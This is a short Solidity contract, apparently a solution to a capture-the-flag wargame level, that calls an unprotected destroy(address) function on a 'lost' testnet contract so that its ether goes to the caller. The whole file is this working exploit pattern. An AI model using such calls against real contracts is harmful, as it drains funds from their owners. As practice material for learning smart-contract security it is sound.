// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Recoverer {
    // A simple Etherscan search allows us to find the lost contract's address
    // https://rinkeby.etherscan.io/address/0x0ed148cfed1246ac101a8bcdc3cdff9604b73d17
    function execute(address lostContract) public returns (bool) {
        (bool success,) = lostContract.call(abi.encodeWithSignature("destroy(address)", msg.sender));
        
        return success;
    }
}